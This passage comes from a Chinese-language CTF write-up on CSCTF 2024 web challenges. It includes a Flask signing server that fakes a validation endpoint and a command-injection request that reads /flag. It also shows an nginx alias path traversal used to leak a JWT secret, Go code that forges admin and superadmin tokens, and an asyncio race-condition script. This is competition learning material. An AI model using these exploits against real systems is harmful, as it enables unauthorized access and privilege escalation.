+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, jsonify</span><br><span class="line">import time</span><br><span class="line">from Crypto.Hash import SHA256</span><br><span class="line">from Crypto.PublicKey import ECC</span><br><span class="line">from Crypto.Signature import DSS</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">key = ECC.import_key(&#x27;&#x27;&#x27;-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgwwP94eTUCNYIgIye</span><br><span class="line">QfbV7ezstOEOjPo27AsYGZ3EI5+hRANCAATmA8G24jcmc63PgzlImXApG9inScMH</span><br><span class="line">f1Tqq2WLDPEioUiULfcxHzJohj/i5kH0ZTtgViPHufUdsidIqEgnMmvM</span><br><span class="line">-----END PRIVATE KEY-----&#x27;&#x27;&#x27;) # 复制privkey内容贴进来</span><br><span class="line"></span><br><span class="line">pubkey = key.public_key().export_key(format=&#x27;PEM&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pubkey&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def get_pubkey():</span><br><span class="line">    return pubkey, 200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain; charset=utf-8&#x27;&#125;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    date = str(int(time.time()) + 7 * 24 * 60 * 60 + 10000)</span><br><span class="line">    h = SHA256.new(date.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    signature = DSS.new(key, &#x27;fips-186-3&#x27;).sign(h)</span><br><span class="line"></span><br><span class="line">    return jsonify(&#123;</span><br><span class="line">        &#x27;date&#x27;: date,</span><br><span class="line">        &#x27;signature&#x27;: signature.hex()</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;YOUR VPS IP&#x27;, port=3000)</span><br></pre></td></tr></table></figure>
+
+<p>修改cookie中preference内容为{“theme”: “light”, “language”: “en”, “validation_server”: “YOUR VPS IP:3000”}并且进行base64编码。</p>
+<p>带着这个cookie访问<a target="_blank" rel="noopener" href="https://feature-unlocked-web-challs.csc.tf/release%E5%BE%97%E5%88%B0%E8%AE%BF%E9%97%AEfeatures%E6%9D%83%E9%99%90">https://feature-unlocked-web-challs.csc.tf/release得到访问features权限</a></p>
+<p>接下来就到了中国CTFer最熟悉的linux RCE环节（））（别笑，老外比赛里全是xss一点不会）</p>
+<p><img src="/images/migrated/18396244/04.png"></p>
+<p>甚至有回显，甚至没过滤，他真的我哭死</p>
+<p>随便打，想怎么打都行了（%23为#的url编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?text=cat /flag %23</span><br></pre></td></tr></table></figure>
+
+<p><strong>CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}</strong></p>
+<h2 id="Trendz"><a href="#Trendz" class="headerlink" title="Trendz"></a>Trendz</h2><p>审计代码，得到题目大致思路为伪造admin的jwt</p>
+<p>这题正解是xss（admin有bot但superadmin没有），而trendzzz正解是伪造jwt。喵的不会xss干脆全部伪造jwt做得了</p>
+<p>validation.go</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">func ValidateAdmin() gin.HandlerFunc &#123;</span><br><span class="line">	return func(c *gin.Context) &#123;</span><br><span class="line">		const bearerSchema = &quot;Bearer &quot;</span><br><span class="line">		var tokenDetected bool = false</span><br><span class="line">		var tokenString string</span><br><span class="line">		authHeader := c.GetHeader(&quot;Authorization&quot;)</span><br><span class="line">		if len(authHeader) != 0 &#123;</span><br><span class="line">			tokenDetected = true</span><br><span class="line">			tokenString = authHeader[len(bearerSchema):]</span><br><span class="line">		&#125;</span><br><span class="line">		if !tokenDetected &#123;</span><br><span class="line">			var err error</span><br><span class="line">			tokenString, err = c.Cookie(&quot;accesstoken&quot;)</span><br><span class="line">			if tokenString == &quot;&quot; || err != nil &#123;</span><br><span class="line">				c.Redirect(302, &quot;/getAccessToken?redirect=&quot;+c.Request.URL.Path)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(tokenString)</span><br><span class="line">		claims := jwt.ExtractClaims(tokenString)</span><br><span class="line">		if claims[&quot;role&quot;] == &quot;admin&quot; || claims[&quot;role&quot;] == &quot;superadmin&quot; &#123;</span><br><span class="line">			fmt.Println(claims)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			fmt.Println(&quot;Token is not valid&quot;)</span><br><span class="line">			c.AbortWithStatusJSON(403, gin.H&#123;&quot;error&quot;: &quot;User Unauthorized&quot;&#125;)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现要伪造身份为admin或superadmin，对应两个flag（trendz和trendzzz）做法完全一样</p>
+<p>但是没有jwt.secret我们什么都干不了，而jwt.secret在与main.go一样的web app根目录下</p>
+<p>然后我就红温了，后来队友告诉我忘看配置文件了</p>
+<p>config</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user  nobody;</span><br><span class="line">worker_processes  auto;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://localhost:8000;</span><br><span class="line">        &#125;</span><br><span class="line">        location /static &#123;</span><br><span class="line">            alias /app/static/;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意到</p>
+<p><img src="/images/migrated/18396244/05.png"></p>
+<p>我：？？？？？？？？？？？？？？？？？？？？？？（怎么这一幕有点似曾相识，好像ZipZone也是没看配置文件导致没做出来）</p>
+<p>谁都没有想到sink居然在他喵的配置文件里（）））这里的static有个alias还没有检查路径穿越</p>
+<p>直接访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static../jwt.secret</span><br></pre></td></tr></table></figure>
+
+<p>就等同于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/static/../jwt.secret</span><br></pre></td></tr></table></figure>
+
+<p>就等同于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/jwt.secret</span><br></pre></td></tr></table></figure>
+
+<p>得到jwt的密钥之后伪造即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/golang-jwt/jwt/v5&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	// 使用给定的密钥</span><br><span class="line">	secretKey := []byte(&quot;7e0e4bba1492788a15328814b328dba359839460\n&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建JWT，包含admin角色</span><br><span class="line">	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims&#123;</span><br><span class="line">		&quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">		&quot;role&quot;:     &quot;admin&quot;,</span><br><span class="line">		&quot;exp&quot;:      time.Now().Add(time.Hour * 24).Unix(), // 设置过期时间为24小时</span><br><span class="line">		&quot;iat&quot;:      time.Now().Unix(),</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	// 签名令牌</span><br><span class="line">	signedToken, err := token.SignedString(secretKey)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(&quot;Error generating token:&quot;, err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;Generated Admin JWT:&quot;, signedToken)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入admin的dashboard查看唯一一个post得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSCTF&#123;0a97afb3-64be-4d96-aa52-86a91a2a3c52&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Trendzzz"><a href="#Trendzzz" class="headerlink" title="Trendzzz"></a>Trendzzz</h2><p>与trendz中我的做法完全相同，把admin换成superadmin就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/golang-jwt/jwt/v5&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	// 使用给定的密钥</span><br><span class="line">	secretKey := []byte(&quot;7e0e4bba1492788a15328814b328dba359839460\n&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建JWT，包含superadmin角色</span><br><span class="line">	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims&#123;</span><br><span class="line">		&quot;username&quot;: &quot;superadmin&quot;,</span><br><span class="line">		&quot;role&quot;:     &quot;superadmin&quot;,</span><br><span class="line">		&quot;exp&quot;:      time.Now().Add(time.Hour * 24).Unix(), // 设置过期时间为24小时</span><br><span class="line">		&quot;iat&quot;:      time.Now().Unix(),</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	// 签名令牌</span><br><span class="line">	signedToken, err := token.SignedString(secretKey)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(&quot;Error generating token:&quot;, err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;Generated SuperAdmin JWT:&quot;, signedToken)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag登陆就送</p>
+<h2 id="Trendzz"><a href="#Trendzz" class="headerlink" title="Trendzz"></a>Trendzz</h2><p>题目说要发表12个post就有flag，但是你只能发表10个post</p>
+<p>像这种题典型的条件竞争，在第十个post发送的时候连续发3个post就行</p>
+<p>exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import aiohttp</span><br><span class="line">import asyncio</span><br><span class="line"></span><br><span class="line">url = &#x27;YOUR URL/user/posts/create&#x27;</span><br><span class="line"></span><br><span class="line">post_data = &#123;</span><br><span class="line">    &quot;title&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;data&quot;: &quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    &quot;accesstoken&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUyNzQxMzksImlhdCI6MTcyNTI3MzUzOSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImgifQ.PT9VM2KV4dSlp3uNTfRuwsJ_3hfaPKaLWNbkZiWt0TQ&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async def Post(session, semaphore):</span><br><span class="line">    async with semaphore:</span><br><span class="line">        async with session.post(url, json=post_data, cookies=cookies) as response:</span><br><span class="line">            text = await response.text()</span><br><span class="line">            print(f&quot;&#123;text&#125;&quot;)</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    concurrency_limit = 100</span><br><span class="line">    semaphore = asyncio.Semaphore(concurrency_limit)</span><br><span class="line"></span><br><span class="line">    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrency_limit)) as session:</span><br><span class="line">        tasks = []</span><br><span class="line">        for i in range(50):</span><br><span class="line">          tasks.append(Post(session, semaphore))</span><br><span class="line">        await asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
+
+<p><strong>CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZipZone"><span class="toc-number">1.1.</span> <span class="toc-text">ZipZone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feature-Unlocked"><span class="toc-number">1.2.</span> <span class="toc-text">Feature Unlocked</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trendz"><span class="toc-number">1.3.</span> <span class="toc-text">Trendz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trendzzz"><span class="toc-number">1.4.</span> <span class="toc-text">Trendzzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trendzz"><span class="toc-number">1.5.</span> <span class="toc-text">Trendzz</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&text=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&is_video=false&description=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSCTF 2024 EICS1 web 部分 wp&body=Check out this article: https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&name=CSCTF 2024 EICS1 web 部分 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&t=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
